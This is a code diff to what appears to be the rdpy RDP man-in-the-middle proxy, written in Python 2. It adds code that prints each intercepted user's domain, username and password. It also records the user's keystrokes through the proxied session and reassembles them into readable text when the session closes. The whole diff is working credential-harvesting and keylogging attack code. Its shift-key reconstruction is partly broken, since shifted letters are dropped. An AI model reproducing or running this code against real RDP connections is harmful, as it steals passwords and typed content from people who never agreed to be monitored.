@@ -34,8 +34,11 @@ import sys, os, getopt, time
 from rdpy.core import log, error, rss
 from rdpy.protocol.rdp import rdp
 from twisted.internet import reactor
+from rdpy.core.scancode import scancodeToChar
 
 log._LOG_LEVEL = log.Level.INFO
+outputList=[]
+count=0
 
 class ProxyServer(rdp.RDPServerObserver):
     """
@@ -72,7 +75,11 @@ class ProxyServer(rdp.RDPServerObserver):
             #try a connection
             domain, username, password = self._controller.getCredentials()
             self._rss.credentials(username, password, domain, self._controller.getHostname())
-            
+	    
+	    print "\nDomain: "+str(domain)
+	    print "Username: "+str(username)
+	    print "Password: "+str(password)
+
             width, height = self._controller.getScreen()
             self._rss.screen(width, height, self._controller.getColorDepth())
             
@@ -93,6 +100,12 @@ class ProxyServer(rdp.RDPServerObserver):
         self._client._controller.close()
         
     def onKeyEventScancode(self, code, isPressed, isExtended):
+	global count
+	if count%2==0:
+		results=scancodeToChar(code)
+		#print results
+		outputList.append(results)
+	count+=1
         """
         @summary: Event call when a keyboard event is catch in scan code format
         @param code: {integer} scan code of key
@@ -187,6 +200,89 @@ class ProxyClient(rdp.RDPClientObserver):
         pass
         
     def onClose(self):
+	tmpResults=[]
+	shiftOn=False
+	for x in outputList:
+		if shiftOn==True:
+			if x=="1":
+				x="!"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="2":
+				x="@"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="3":
+				x="#"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="4":
+				x="$"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="5":
+				x="%"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="6":
+				x="^"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="7":
+				x="&"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="8":
+				x="*"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="9":
+				x="("
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="0":
+				x=")"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="-":
+				x="_"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="=":
+				x="+"
+				shiftOn=False
+				tmpResults.append(x)
+			if x==";":
+				x=":"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="'":
+				x="\""
+				shiftOn=False
+				tmpResults.append(x)
+			if x==",":
+				x="<"
+				shiftOn=False
+				tmpResults.append(x)
+			if x==".":
+				x=">"
+				shiftOn=False
+				tmpResults.append(x)
+			if x=="/":
+				x="?"
+				shiftOn=False
+				tmpResults.append(x)
+		else:
+			if x=="<shift>":
+				shiftOn=True
+			elif x=="<space>":
+				tmpResults.append(" ")
+			else:
+				tmpResults.append(x)
+	tmpResults1=''.join(tmpResults)
+	print "\n------ Results -------"
+	print tmpResults1
+
         """
         @summary: Event inform that stack is close
         @see: rdp.RDPClientObserver.onClose
